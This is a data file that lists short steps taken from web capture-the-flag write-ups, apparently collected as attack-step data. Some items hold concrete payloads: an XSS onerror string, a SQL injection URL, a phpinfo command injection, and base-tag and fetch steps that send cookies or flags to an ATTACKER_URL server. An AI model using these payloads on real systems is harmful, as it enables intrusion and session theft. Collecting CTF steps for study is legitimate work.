    "Navigate to the network tab.",
    "Press the enter key.",
    "Browse the 'user' directory.",
    "Construct the request for the flag",
    "Send the request to the server",
    "Visit the company website for the CTF challenge",
    "Observe URL Capture button on the website",
    "Observe Admin button on the website",
    "Find out that the URL capture service takes a screenshot",
    "Attempt to access localhost on the URL capture service",
    "Succeed in accessing localhost on the URL capture service",
    "Observe that the loading splash screen is identical to the challenge website",
    "Check the content of robots.txt",
    "Visit the login page.",
    "Confirm that no error occurs.",
    "Send a post request with the payload for every possible character in the flag.",
    "Activate accessibility tools in the Tools section",
    "Type the hidden sheet's name",
    "Hidden sheet gets added to the panes",
    "Submit the login form.",
    "Click on the 'simple quiz' link or button to navigate to the quiz section.",
    "Search or browse through the quiz section to find the flag.",
    "Verify the flag on the website.",
    "Entered 'view-source:https://no-right-click.hsc.tf/useless-file.css' in the browser's address bar.",
    "Investigate the site.",
    "Visited the website and viewed the login page",
    "Sent the JSON body to the server",
    "Used Burp Suite to intercept the login request",
    "Noted that exception messages are displayed in alert pop-ups",
    "Explore the public feed.",
    "Explore the profile settings.",
    "Explore the report link.",
    "Explore the create post button.",
    "Explore the search functionality.",
    "Explore the copy profile link feature.",
    "Explore the followers functionality.",
    "Discover that JavaScript is blocked.",
    "Understand that the script would theoretically make any user follow the attacker account.",
    "Get the uploaded HTML file link from the webpage.",
    "Visit the admin's profile and find out it is private.",
    "Find a 'follow' button on the admin's profile.",
    "Receive a pending request response.",
    "Understand that a POST request must be sent to '/profile/request' to make admin accept the follow request.",
    "Utilize the curl command to navigate through subdirectories.",
    "Inserted file name in the URL.",
    "URL: http://172.17.15.117:443/3e6f0e21-7faa-429f-8a1d-3f715a520da4.png",
    "Connect to target IP:33337.",
    "Observe redirection to domain name threeofhearts.ctf.net.",
    "Receive 400 error response for the first GET request.",
    "Receive internal web page response for th second GET request.",
    "Set the 'Host' header manually to threeofhearts.ctf.net.",
    "Discover PHP form for var1 and var2.",
    "Submit PHP form.",
    "Receive GET request to /save.php.",
    "Determine inaccessibility of /private.php.",
    "Send request to /save.php.",
    "Include 'Transfer-Encoding: chunked' header in the request.",
    "Include 'Content-Length:53' header in the request.",
    "Access /private.php.",
    "Include fetched headers in the request.",
    "Arrive at page with the flag.",
    "Discover web app.",
    "Observe register and login pages.",
    "Navigate to registration page.",
    "Submit registration form.",
    "Include the parameter in the request.",
    "Observe availability of admin button.",
    "Locate admin button on the webpage.",
    "Click the admin button.",
    "Performed the action of setting up socks correctly.",
    "Performed the action of accessing challenges.",
    "Discover a method to bypass the character limit issue",
    "Successfully retrieve a link",
    "Follow the retrieved link",
    "Access the website.",
    "Notice the website information.",
    "Send the modified request.",
    "Access a website.",
    "Observe a list of four different image galleries.",
    "Notice that the URL changes when querying any other galleries.",
    "Attempt to use the local-host address.",
    "Find a box inside the admin panel.",
    "Access the newly public gallery.",
    "Sent a GET request",
    "URL: http://challenge.nahamcon.com:31428/",
    "Used X-Forwarded-For header",
    "Set X-Forwarded-For header",
    "Value: 127.0.0.1",
    "Emulate local host client access",
    "Accessed the given website.",
    "The XML payload was uploaded to the 'trial' tab of the web interface.",
    "Used the 'view XML' tab on the web interface.",
    "Open the website.",
    "Examine the interface of the website.",
    "Find the URL of /robots.txt.",
    "Access the /robots.txt URL.",
    "Navigate to the disallowed path /ingen/",
    "Visit the website.",
    "Perform GET request to host https://space.sdc.tf with the endpoint /api/status.",
    "Request the /fuel endpoint.",
    "Attempt a simple GET request to /rocketLaunch.",
    "Send a POST request with 'launch' attribute set to true.",
    "Successfully complete the POST request with all required parameters.",
    "Observe the response from the web application.",
    "Locate the 'admin' page.",
    "Login on 'admin.html'.",
    "Retrieved the link to the admin portal from student communication",
    "Accessed admin panel",
    "Define the URL of the website.",
    "Send a POST request.",
    "Visit the rule page.",
    "Read the page carefully.",
    "Keep reading until reaching the line at the bottom.",
    "Inspect the functionality of the website.",
    "Examine the URLs associated with different users and photos.",
    "Try to load a webpage associated with the 'admin' user.",
    "Discover that the site restricts images to the same origin.",
    "Send image data externally using the 'src' attribute of the generated script tag.",
    "Split the data because it exceeded the length limit for the URL.",
    "Send the URLs to the bot.",
    "Display the data in HTML to obtain the flag.",
    "Send the payload via POST request.",
    "Change the value of 'likeCookie' to true.",
    "Send a GET request to the target URL with each possible 'likeCookie' value (from 0 to 19).",
    "Recognize that 'mobile-viewer' couldn't directly interact with server.",
    "Recognize them as screenshots.",
    "Realize the need to request 'http://genflag/flag'.",
    "Identify 'website' as the same site for the request.",
    "Use Fetch API on 'mobile-viewer' page.",
    "Transmit it safely in an HTTP GET request to the attacker's server.",
    "Accessed the Cowsay as a Service Challenge website",
    "Executed a HTTP POST request",
    "Set the settings",
    "Observe the rewriting and forwarding of the request to the pre-renderer at `http://renderer:3000`.",
    "Infer that Chrome is used for rendering JavaScript.",
    "Set the host header.",
    "Ensure that the renderer visits our attacker-controlled site.",
    "Redirect the browser using the `Location` header.",
    "Create a `redirect.php` file.",
    "Ensure that visiting `redirect.php` redirects the renderer's browser to the second exploit page.",
    "Create an iframe within `exploit.html` with the source set to `http://localhost:3000/render?url=http://api:8000/`.",
    "Bypass SOP.",
    "Exploit the fact that the current site and the iframe's source are both `http://localhost:3000`.",
    "Receive the contents of the iframe.",
    "Discover that the 'language' field is set according to the parameter passed via the POST handler for '/localization-language'.",
    "Send a POST request to the '/localization-language' endpoint.",
    "Send a GET request to '/localisation-file'.",
    "Identify a Flask webpage",
    "Recognize the usage of GET request arguments",
    "Formulate a GET request",
    "Construct another GET request",
    "Observe that the username is reflected back into the username field.",
    "Find that 'notes.count' is being executed through websockets.",
    "Validate that only one result is returned.",
    "Initialize a GET request.",
    "Target the URL for the GET request.",
    "Send POST request to upload the generated file.",
    "Send a POST request to upload the created file.",
    "Send a GET request to '/download_all' to trigger the exploit.",
    "Visit lukas-app.de.",
    "Observe that it's a static site.",
    "Notice a redirect to a different domain when fetching an image.",
    "Bypass double URL decoding by server.",
    "Visit the website with the updated cookies.",
    "Users were redirected to '/callback' on the frontend application.",
    "Due to frontend processing, this resulted in the same verified message but carrying a different meaning.",
    "Viewed the invoice URL in the format '/legacy_invoice_system/BASE64_ENCODED_STRING'.",
    "Passed the input to the injection point at 'GET /legacy_invoice_system/*'.",
    "Identify available endpoints.",
    "Observe the vulnerability in the incoming responses at the '/checkbalance' endpoint.",
    "Notice that users are redirected.",
    "Observe redirection when the queried amount exceeds the user's actual balance.",
    "Determine that window's history length can reveal whether a redirection occurred.",
    "Open a new window from the exploit server.",
    "Wait for the site to load.",
    "Observe the possibility of redirection to '/' depending on the user's balance.",
    "Change the window's location back to the exploit server.",
    "Check the window's 'history.length' attribute.",
    "Analyze the 'history.length' attribute to determine if a redirect occurred.",
    "Check redirection in the window.",
    "Navigate to the '/checkbalance' endpoint with the queried amount.",
    "Consider the possibility of redirection during the delay.",
    "Change the location of the pop-up back to the exploit server.",
    "Check the length of the window's history.",
    "Analyze the window's history length to determine if a redirection has occurred.",
    "Received a Markdown Editor web application to host notes for a challenge",
    "Found that the preview feature is an iframe",
    "Preview button posts a message to the iframe",
    "Iframe's message is received and processed in /demo",
    "Iframe posts the response from the /api/filter endpoint to window.parent",
    "Any site can create an iframe of the web application and receive the message",
    "Payload loads /demo in an iframe",
    "Payload posts a message to trigger the /api/filter POST request in the admin's context",
    "Identify the POST request to /add for adding notes.",
    "Understand the relationship between the endpoints and the user's ID cookie in the Notes map.",
    "Identify that cookies are set to prevent XSS for all API endpoints.",
    "Set the Path of the custom cookie to /get.",
    "Ensure the XSS payload fits within the 75 character limit.",
    "Use the /find endpoint.",
    "In the script, manipulate the multiple URL opens.",
    "Replace the multiple URL opens with actual browser window opens.",
    "Have the user (admin) visit the URLs.",
    "Redirect the user to the main site.",
    "Identify a URL for the server to request.",
    "Identify the hostname as 'redis' and port as 6379.",
    "Understand that a 'Requests_On_Steroids' function is used for POST request.",
    "Fetch the URL using the 'Requests_On_Steroids' function.",
    "Show the flag in the response.",
    "Discover that instead of 'gopher://' protocol, 'inctf://' should be used.",
    "Remove '/_' in the URL's path.",
    "Send the crafted request to confirm the presence of the vulnerability.",
    "Recognize the existence of '/set.php' page.",
    "Craft a request to set the theme to the PHP payload.",
    "Perform batching in GraphQL to send multiple queries at once, with the anticipation that the server will process all queries together using the same CAPTCHA code.",
    "Identified 'Server' response header.",
    "Recognized vulnerability as a request smuggling vulnerability.",
    "Observed the server using 'Content-Length' header.",
    "Noticed that the server uses 'Content-Length' header even if 'Transfer-Encoding' header exists.",
    "Observed a request to '/save.php'.",
    "Assumed an admin visit to the site.",
    "Directed the admin to '/save.php'.",
    "Included the 'Content-Length' header in the payload.",
    "Included the 'Transfer-Encoding' header in the payload.",
    "Observed that Nginx sees the 'Transfer-Encoding' header.",
    "Noticed that Nginx considers the first request ended with the 'Transfer-Encoding' header.",
    "Noted the existence of the second request 'GET /save.php HTTP/1.1'.",
    "Recognized that the second request is not yet completed after the end of the first request.",
    "Identified the admin's visit as a third request.",
    "Recognized that the admin's request is appended to the incomplete second request.",
    "Noted that the appended requests are processed as one single request.",
    "Observed redirection to `/users/<username>/files` after registration.",
    "Redirected to own account upon a successful enumeration (403 redirect).",
    "Received 404 Not Found error upon a failed enumeration.",
    "Access the '/admin' page",
    "Determine that the identified application is a web application.",
    "Locate the login function in the web application.",
    "Note the challenge has a web interface.",
    "Name the cookie 'visited-main-page'.",
    "Access '/admin'.",
    "Choose to make an internal request.",
    "Specify the '/admin' path as the target.",
    "Include the '/gallery?galleryUrl=' query parameter.",
    "Find a HTTP service.",
    "Identify the GET form with 'search' parameter in 10.0.42.200.",
    "Visit the URL `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole`.",
    "Upload 'collision1.pdf' to the challenge page.",
    "Upload 'collision2.pdf' to the challenge page.",
    "Accessed the Startup Company web page.",
    "Access the provided URL",
    "Download the robots.txt file",
    "Attempt to navigate to /admin.phps",
    "Navigate to /index.phps",
    "Navigate to /authentication.phps",
    "Navigate to /authentication.php",
    "Observe that the flag is revealed on the browser",
    "Accessed the website provided in the challenge",
    "Checked the filter page for clues or information",
    "Checked the filter page again to see any changes",
    "Attempted the third web Gauntlet where the length requirement is reduced",
    "Visited the URL provided in the problem statement.",
    "Made a request to the file.",
    "Reflected the result into the 'user' tag of the HTML response.",
    "Executed HTTP POST request to the target server.",
    "Accessed the provided web page http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719",
    "Accessed the Favicon of the webpage",
    "Found new endpoint for POST requests",
    "Located a PHP webpage.",
    "Identified a login.php page.",
    "Modified 'X-Forwarded-For' header value.",
    "Set the header value to the internal IP address observed from gallery.php.",
    "Located a form on the login page.",
    "Accessed a users.php page.",
    "Accessed the URL /users.php?id=1.",
    "Intercept the HTTP request",
    "Modify the HTTP GET parameter",
    "Set the GET parameter to 'print=echo+'';phpinfo()'",
    "Visited the challenge website.",
    "Tried to understand how the website works.",
    "Used Chrome DevTools.",
    "Learned that the search feature places the query into the URL's fragment identifier.",
    "Saw that search results affect which image loads.",
    "Understood that the admin bot visits any URL provided.",
    "Realized it might be possible to force the admin bot to perform a search function on the server.",
    "Considered using the presence of 'y.png' or 'n.png' in the cache as an indicator of search success.",
    "The payload loads an iframe of the notes site with a search query.",
    "Realized that the cache is not separated between headless and non-headless Chrome instances.",
    "The solution involves controlling a subdomain that matches the site domain.",
    "Identified that the website is a GitHub Pages site.",
    "Realized that an attacker can set up a GitHub Pages site with a subdomain that matches the site domain.",
    "The site's subdomain matches the target domain.",
    "The payload is deployed to the new GitHub Pages site.",
    "Observe the sending of an SMS",
    "Access the flag purchase system",
    "Understand each book's URL structure on server.",
    "Observe the behavior of file downloads.",
    "Given the /request endpoint from challenge.",
    "Identified behavior: if the host is not found or the URL is invalid, a specific message is returned.",
    "Returns response headers.",
    "Given an endpoint that allows sending feedback in form of HTML.",
    "Extracted the page URL.",
    "Learned that our submitted HTML was the only content present on the page.",
    "Used the discovered page URL (`http://0.0.0.0/Secret_admin_cookie_panel`)",
    "Identified a `/flag` endpoint.",
    "Allowed access to the `/flag` endpoint.",
    "Identify the '/guest' endpoint.",
    "Received the flag from the HTTP server.",
    "Visit the webpage.",
    "Look for available endpoints in the downloaded `openapi.json` file.",
    "Note that the Traefik service acts as a reverse proxy for the Go microservice",
    "Note that the Python microservice allows the running of arbitrary commands when the GET method is used",
    "Realize the challenge of reaching the Python microservice while the Traefik proxy only allows the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Find a way of issuing a pseudo PUT request by using a POST request with a '_method' query parameter set to PUT",
    "Make a request to the Go microservice using a POST method",
    "Include a '_method=PUT' query parameter in the request",
    "Include differing 'Content-Length' header values in the request",
    "Submit the same payload multiple times.",
    "Understand the necessity of having at least 32 characters in the 'fqdn'.",
    "Derive a URL that starts with 32 bytes of hexadecimal characters using leading 0's.",
    "Ensure the trailing '.ping-proxy/ping' turns into a URL fragment.",
    "Append '#' at the end of the 'fqdn' to make the final URL your public IP address.",
    "Observe the flag in the request header.",
    "Notice that the application is a 'screenshotter' service.",
    "Notice that the entered URLs are rendered by a Chromium instance.",
    "Observe that the service doesn't allow for file:// protocol.",
    "Observe that the service validates the URL to be HTTP(S).",
    "Understand that the exposed port allows commands to be sent to the browser through the DevTools protocol.",
    "Use the Promise to try and load a URL.",
    "Attempt to send this information to a remote server.",
    "Request Chromium to open a new webpage.",
    "Target the URL file:///tmp/flag.txt.",
    "Display the flag in the browser instance.",
    "Fetch the screenshotter service.",
    "Put the result in an iframe.",
    "Display the iframe in the screenshotting service.",
    "Take the screenshot of the flag.",
    "Create a WebSocket connection to the DevTools of the browser instance.",
    "Send JavaScript code to the browser instance.",
    "The JavaScript sends a POST request.",
    "Visit the website.",
    "Observe the URL http://asuna.nullsession.pw.",
    "Observe the HTTP response.",
    "Try using /search as per instructions in the response.",
    "Receive 403 Forbidden.",
    "Notice the 'Server' header in HTTP response.",
    "Visited the website.",
    "Inspected the proxy server.",
    "Noticed that the proxy server makes a request to the backend server.",
    "Understood that a user-controlled 'uri' is involved in the attack.",
    "Formed a request to the proxy server.",
    "Included a 'uri' parameter with a malformed path, such as //ATTACKER-URL, in the request.",
    "Used the 'secret' token to send a request directly to the backend server.",
    "Explore the non-admin path, /sakura.",
    "Used the provided URL for registration.",
    "Accessed the '/cornelia' URL.",
    "Performed a GET request on the chosen URL.",
    "Located the vulnerability in the '/cornelia' URL.",
    "Noted the validation preventing 'localhost' or '127.0.0.1'.",
    "Leveraged the server's behavior of following redirects.",
    "Access the website at the URL: http://chals.ctf.sg:40401",
    "Generate a GET request to the page, with the chosen strings as the values for 'i1' and 'i2'",
    "Discovered an `AdminPage`.",
    "Identified a `/api/flag` endpoint.",
    "Recognized that the `/api/flag` endpoint is fetched using `postRequestWithCookies`.",
    "Identified a `/api/token` endpoint.",
    "Recognized that the `/api/token` endpoint is in `LoginPage`.",
    "Realized that modifying the parameters allows callback to our server.",
    "Realized that rendering unescaped HTML was unsuccessful.",
    "Used `Access-Control-Allow-Origin: *` header.",
    "Noted that the `ApiMapper` makes a GET request.",
    "Triggered the `api_post` event.",
    "Retrieved the flag from the `/api/flag` endpoint.",
    "Access the webpage.",
    "Observe the interface to a router with a ping functionality.",
    "Identify a specific end-point '/ping?id='.",
    "Retrieve data from the response.",
    "Realize that this results in the setting of the innerHTML of the 'result' element.",
    "Place the URL-encoded string in the URL parameter 'demo'.",
    "Submit a URL to the '/share' endpoint.",
    "Visit the URL submitted to the '/share' endpoint by an admin bot.",
    "Identify the '/queue' WebSocket endpoint.",
    "Perform a GET-based CSRF through a top-level navigation.",
    "Notice that ws.origin corresponds to the Origin request header.",
    "Recognize that the Origin request header comprises the webpage URL in the format: ://hostname:port.",
    "Realize that the exploit page's origin must start with 'http://localhost'.",
    "Acknowledge that there is no known way to bypass the requirement for 'http://localhost' as the origin.",
    "Manipulate the fact that WebSocket connection validation does not guarantee that the page is hosted on localhost.",
    "Consider using a domain starting with localhost, such as localhost.zeyu2001.com.",
    "Recognize that WebSockets are not restricted by the Same-Origin Policy.",
    "Construct a page hosted on a domain starting with 'localhost'.",
    "Submit the constructed page to the '/share' endpoint.",
    "Open a WebSocket to 'ws://localhost:7070/quote'.",
    "Result in 'Wrong Password!' message.",
    "Append payload to '/readflag' command in 'f' GET parameter.",
    "Leveraged the '<base>' HTML tag to set the base URL for all relative URLs in the document, helping bypass the Content Security Policy.",
    "Crafted a URL that appended an HTML header tag to the domain part of the email parameter, thereby exploiting the lax character restriction.",
    "Explored the website functionality",
    "Discovered an image rendering feature that places text onto a T-shirt image",
    "Tried to load an external resource (JavaScript or stylesheet)",
    "URL format: `http://challenge.nahamcon.com:32132/exploit?text=%3Ciframe%20src=%22https://ATTACKER_URL/exploit.html%22%3E&color=%2324d600`",
    "Target '/reset2fa' as the destination of the POST request.",
    "Use the 'fetch' function to send the response text to an external URL.",
    "Send a POST request to '/show_secret'.",
    "Include 'Content-Type: application/json' in the request header.",
    "Use the 'fetch' function to send the response text to an external URL.",
    "Identified the need for a '.jsapi.tech' subdomain takeover.",
    "Recognized the ability to 'preview' HTML without saving it.",
    "Inserted HTML through 'preview' feature.",
    "Checked for an extra div when search is correct.",
    "Visited the website 'https://chall1.jsapi.tech'.",
    "Observed the HTML interface for writing and saving notes.",
    "Checked if the 'enableapi' query parameter was set to 'true'.",
    "Checked if the 'recv' query parameter was a subdomain of 'jsapi.tech'.",
    "Checked if the window was framed or opened by another window.",
    "Verified the GitHub pages site at 'asdf.jsapi.tech' can be served.",
    "Understood the condition for adding DOMPurify-sanitized HTML into the child iframe.",
    "Noted that the postMessage should start with 'NOTE_APP_SET_REQUEST' to trigger the addition.",
    "Noted that adding something before the '<link>' tag fixes the behaviour.",
    "Discovered that CSS attribute selectors can be used for exfiltration.",
    "Confirmed that the URL specified in the 'background' property is fetched conditionally.",
    "Noted that each character of the flag has a background URL corresponding to it.",
    "Loaded the challenge page as an 'iframe' in the exploit page.",
    "Waited for the API to be loaded in the challenge page.",
    "Sent a 'postMessage' linking the generated CSS to the target page.",
    "Redeployed the exploit GitHub page.",
    "Recognized that the '/flag' endpoint is case sensitive.",
    "Requested the '/FLAG' endpoint.",
    "Executed a POST request.",
    "Included an overflowing 'Content-Length' header.",
    "Included a second 'Content-Length' header with a value of 26.",
    "Placed a second dummy 'GET / HTTP/1.1' request.",
    "The second request was treated as a separate request by HAProxy.",
    "Modified the requests after reaching the backend server.",
    "Set 'GET /flag HTTP/1.1' as the second request.",
    "Received a response for the second consequent request.",
    "The response corresponded to '/flag' instead of '/'.",
    "Visit the target website.",
    "Manipulate the '<base>' tag in the target website to change the base URL to the control of the attacker.",
    "Create a crafted attack URL with '?src=/img/saturn.jpg'><base href=\"http://ATTACKER_URL\">'.",
    "Trigger the browser to fetch the attacker-controlled site's root path, '/' with the cookie value appended.",
    "Verify that the identified web application allows file uploads and conversions.",
    "Evaluate the web application's functionality to identify potential SSRF or file inclusion vectors.",
    "Submit the file upload request and monitor for any callbacks from the server.",
    "Analyzed the challenge website where notes could be created and searched.",
    "Investigated the search function.",
    "Observed the usage of 302 server-side redirect to '/view' for a matching note.",
    "Researched the Fetch API's limit of 20 redirects causing a network error.",
    "Redirected the attacker server to the target URL after 19 redirects.",
    "Redirected the PHP script to the target URL after 19 redirects.",
    "Observed reflection of the input into an XSL document.",
    "Tested rendering in the browser.",
    "Understand purchasing requests and conditions.",
    "Send purchase requests to the API.",
    "Send POST request to '/api/tet/list' endpoint.",
    "Send POST request to '/api/tet/years' endpoint.",
    "Navigate to the root directory.",
    "Visited the provided webpage",
    "Sent a request to the API endpoint",
    "Recognize that access is prevented unless not going through the proxy.",
    "Recognize that STTF is a Chromium feature.",
    "Understand that STTF allows scrolling to a specific portion of the page using a text snippet in the URL.",
    "Use the lazy-loaded image.",
    "Detect if a scroll occurred when a text fragment is parsed in the URL.",
    "HTTP POST request to sell flag with negative price",
    "Directly access flag with 'flag_id=3' using HTTP POST /buy request",
    "Note the presence of a Content Security Policy (CSP) to prevent XSS attacks.",
    "Observe that the page uses relative JavaScript paths.",
    "Change the base URI of the page.",
    "Recognize that this is usually not possible due to the CSP.",
    "Host a file at `/static/page.js` on the attacker server.",
    "Send GET request to 'https://shiba.yactf.ru/'.",
    "Send GET request to 'https://shiba.yactf.ru/api/boop' 1500 times within the loop.",
    "Send GET request to 'https://shiba.yactf.ru/' to get the final page after 1500 iterations.",
    "Realize that the tokens are used to count the number of 'boops'.",
    "Look for '/robots.txt' to find a hint about the public key location.",
    "After unsuccessful attempts searching for YouTube's JSONP endpoints.",
    "Triggered a JSONP response from the YouTube API.",
    "Identified the URL of the flag containing post '/post/68a30ae2-a8f3-4d12-9ffa-0564a3a7177b' from the exfiltrated contents.",
    "Request the website.",
    "Specify the 'news' category by adding '?cat=news' to the URL.",
    "Analyze the HTML response.",
    "Conclude that an alternate route to XSS is required.",
    "Observe the site fetching resources.",
    "Utilize the 'cat' parameter in a request to '/ajax/articles?cat=asdf\"x=\"'.",
    "Load only the 'img' element.",
    "Render the XSS payload: '<img src=\"/images/error.jpg\" alt=\"selected category random\"onerror=\"alert``\" />'",
    "Inspect the search feature of the provided platform",
    "Look at the responses when searching for a note",
    "Examine the issued redirects",
    "Notice the difference in redirect URLs when a note is found or not found",
    "Explore the possibility of detecting a client-side error when exceeding Chrome's maximum URL length (2MB)",
    "Experiment with creating a URL that just hits the length limit",
    "Observe a redirection to an 'about:blank#blocked' page when the limit is exceeded",
    "Notice that if the URL limit is hit, the origin of the page remains that of the parent window",
    "Test the observation by creating a URL for a successful and unsuccessful query respectively",
    "Queries leading to a different domain will be blocked",
    "Test inputting content in MiniMag format",
    "Test inputting content in BBCode format",
    "The content in MiniMag and BBCode format is accepted as 'format' in the post submission request data",
    "The POST-based XSS vectors are not exploitable for admin privilege access",
    "Create a fetch request",
    "Modify fetch request to include polluted `credentials: include` option",
    "Recognize ATS interpreting \"chunked\" as chunked.",
    "Recognize Puma ignoring invalid / unsupported TE values.",
    "Craft a request to smuggle a request to /admin in flagportal.",
    "Understand that the previous request smuggling method will not capture the second response from Puma.",
    "Recognized that /api/flag-plz is mapped to /forbidden.",
    "Recognized that /api is mapped to /.",
    "Realized that http://flagportal.chall.seetf.sg:10001/api//flag-plz would be mapped to http://backend/flag-plz.",
    "Used the discovered mapping to smuggle a request to /admin in flagportal.",
    "Encapsulated the second request within the chunked contents of the first request.",
    "Understand that the URL rewriting is done using the host header",
    "Attempt to achieve this using client-sided redirects",
    "Understand that the usage of 'localhost:3000' origin avoids the Same Origin Policy",
    "Understand that the mechanism validates the URL format",
    "Acknowledge the replacement of flags by Nginx",
    "Understand that redirects to 'http://app/login.php' will not solve the challenge",
    "Understand the requirement of achieving XSS within the 'localhost:3000' origin",
    "Understand the usage of 'localhost:3000/render?url=' feature",
    "Understand the need to avoid the same-origin policy for reading the flag",
    "Host the 'outer.html' file",
    "Host the 'inner.html' file",
    "Send a GET request to 'outer.html'",
    "The URL is fetched for the first time to check for an SSRF attempt.",
    "The URL is fetched for the second time once it's deemed legitimate.",
    "Programmed the server to redirect to 'http://localhost/flag' in the second response.",
    "Use the navigation factor.",
    "Leverage the navigation function and the XS leak.",
    "Use '?length=' as the query string.",
    "Ensure that 'usernameLength' is empty through the query string.",
    "Use 'window.open()' on the exploit server.",
    "Confirmed server-side file inclusion.",
    "Discorded 'robots.txt' file at '?file=robots.txt'.",
    "Monitor the response for headers.",
    "Include the correct 'Authorization' header.",
    "Use the new token for authentication.",
    "Use only the first five elements of the array to create the file name",
    "The file name resolves to flag.txt after the process",
    "Read the information about 'Brobot' in the 'index.html' file",
    "Understand the information as a hint towards 'robots.txt'",
    "Realize it is similar to 'window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]'",
    "Test CSS injection",
    "Create a signed cookie in the browser.",
    "Access the website's source code",
    "Observe the image",
    "Locate the 'Host' header in the HTTP request.",
    "Set the 'Host' as 'dscvit.com'.",
    "Set the cookie as 'user=root'.",
    "Add a JSON object '{\"foo\":\"bar\"}' to the body.",
    "Set the cookie to a given string",
    "Identified the new flag value in the response",
    "Identified a different flag value in the response",
    "This solution works for the 'Gate Keeper' challenge as well.",
    "The data content for the request is constructed dynamically with a key-value pair.",
    "The value for the key-value pair is the payload.",
    "Used a known attribute in the object",
    "Discover a template injection vulnerability.",
    "Identify a meta tag with the name attribute 'redpwnctf2020' in the HTML source code.",
    "Retrieve the value of the content attribute from the identified meta tag.",
    "Inject a random '<h1>Hello</h1>' tag.",
    "Encode the payload in base64.",
    "Submit the crafted URL to the Admin Bot.",
    "Utilize the specified attributes to redirect.",
    "Assign the document's cookie to the query parameter of a specified URL.",
    "Include the XSS payload in the URL.",
    "Intercept the bot's browser cookie.",
    "Wait for the bot to visit the sabotaged webpage.",
    "View the homepage source",
    "Receive a gif in response",
    "Verify that an 'upload' page is mentioned in the challenge description",
    "Decode the copied JWT token using a website like jwt.io.",
    "Identify the id of the newly created user from the received user list.",
    "Site has a login screen.",
    "Received a link to the running instance of the challenged web project.",
    "Confirm the ability to upload TPL files.",
    "Explored the site using ZAP Proxy.",
    "Identified /login and /forgotpassword.html as especially interesting.",
    "Identify the presence of a form to create users.",
    "Identify the indication of whether users are admins.",
    "Retrieve the flag using the customized request.",
    "Revealed current directory as '/var/www/html'.",
    "Listed environment variables.",
    "Attempt to open the 'robots.txt' file.",
    "Planned to execute 'curl http://localhost:3000/get_flag' to obtain output through the webpage.",
    "Our malicious script grabs the current cookies and redirects to our webpage with these cookies as parameters in the request.",
    "Select the generated barcode file for upload.",
    "Locate the flag within the results.",
    "Read index.html.",
    "Isolate the '/' character.",
    "Build the path to the flag.",
    "Input {{ state }}",
    "View the HTML source code of the website",
    "Encounter a login page.",
    "Use the new session cookie to log into the site.",
    "Input the new cookie.",
    "Search for Robots.txt file.",
    "Inspect website's code.",
    "Discover admin login page.",
    "Perform login.",
    "Receive cookie as a result of successful login.",
    "Discovered a suspicious 'data' parameter in the URL.",
    "Read the information about logging in via POST and using json request",
    "Accessed the robots.txt file of the website",
    "Identified the '/flag' endpoint in the robots.txt file",
    "Included the newly edited admin jwt token in the request",
    "View the login form",
    "Use the newly generated token as a cookie",
    "Found a `token` cookie.",
    "Checked the value of the `token` cookie on jwt.io.",
    "Accessed the `/robots.txt` file.",
    "Found a public key in the `/robots.txt` file.",
    "Set the token as a cookie.",
    "Retrieve the flag.",
    "Include the SQL injection payload in a complete request.",
    "Observe that the submission is accepted.",
    "Use each character as the value for both 'pass' and the User-Agent header",
    "Observe the presence of a login form",
    "Identify a cookie named 'admin_id : 0'",
    "Locate the 'admin_id' cookie",
    "Observe the flag after refreshing the page",
    "Extract the flag from the HTML content of the response",
    "Observe within the content of the page.",
    "Identify the 'secret' tag which contains the flag.",
    "Attempted to induce an SQL injection by inputting the URL 'https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20or%20id=%271'.",
    "Included the payload in the URL.",
    "Included the new payload in the URL.",
    "Ensure the payload visualizes and reads contents of 'flag.php'.",
    "Discover 'scriptlet' endpoint",
    "Set the value of the header 'answer' as 'Fear the Old Blood'",
    "Include a calculation statement in the request",
    "Tried a wrong HTTP verb.",
    "Took note of the different server requests that were sent as a result.",
    "Note that the number of pages is shown",
    "Deduced that two different strings should give the same md5 hash.",
    "Discover that the guest sign in portal is not implemented",
    "Craft a valid JWT with '31337' identity",
    "Include the crafted JWT in the `Authorization` header",
    "Recognize the potential CSRF vulnerability based on the CSRF token.",
    "Ensure the known username 'true.grit@umbccd.io' remains intact in the manipulated request.",
    "Check the cookies being set.",
    "Decode the ASCII representation to readable text using JavaScript console",
    "Observe that comments under a picture can be inserted.",
    "Step 1: Insert the comment as a preview.",
    "Attempt authentication with the user created.",
    "Flag found: 'OOO{did you see my dog}'.",
    "Examined the functionality endpoint '/files/'.",
    "Crafted a malicious HTTP request.",
    "Included a special character between 'Transfer-Encoding:' and 'chunked'.",
    "Bypassed localhost address checks by setting the '$url' attribute to 'file:///var/www/html/config.php'.",
    "Circumvented file extension checks on '.php' by replacing '.' character with '%252e'.",
    "Manipulate the HTML structure",
    "Create an insertion point",
    "Create a secondary note",
    "Pass the malicious note_id from the previous step",
    "Find the 'robots.txt' file",
    "Discover the SQL Injection payload from the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,null,null,text,null,null/**/from/**/posts'",
    "Checked the category and points of the challenge. It was a web category and was worth 1783 points.",
    "Identified an authentication form on the webpage.",
    "Found an interesting comment in the HTML source code: '?sauce'.",
    "Review the presented source code",
    "Pass serialized input via 'id' HTTP GET parameter",
    "Pass payload as parameter",
    "Notice that the form allows execution of a ping command.",
    "Note the session info",
    "Use the modified cookie",
    "Passed an arbitrary character(',') into the X-FORWARDED-FOR HTTP header.",
    "Use 'cd S3Scanner/'",
    "Use 'cd buckets/bucketsoffun-ctf/'",
    "Receive a message that this page is for authentication with an API located at port 4000.",
    "Receive an error: Forbidden, missing JWT authorization.",
    "Receive a JWT(token).",
    "Discover a comment from the API documentation page's HTML source hinting about a robots.txt file located at http://ctfchallenges.ritsec.club:3000/robots.txt.",
    "Identify additional pages: upload.php and photos.php",
    "Attempt to access common pages like foo.php.",
    "Note that the server response includes the author of the feedback.",
    "Recognize that the username taken from the session is not properly sanitized",
    "Login with the registered user once",
    "Logout",
    "Re-login",
    "Identified that the blog owner has preference for Canonical and Bazaar.",
    "Received a 'HTTP 403 Forbidden' error, suggesting the '.bzr' directory's presence.",
    "Determine that the certificate seems invalid.",
    "Observe the flag displayed on the website.",
    "Web page performs a password reset function using security questions",
    "Confirm that the URL is a file sharing site",
    "Inspect how the website stores the 'name' parameter",
    "Retrieve the flag from the refreshed webpage",
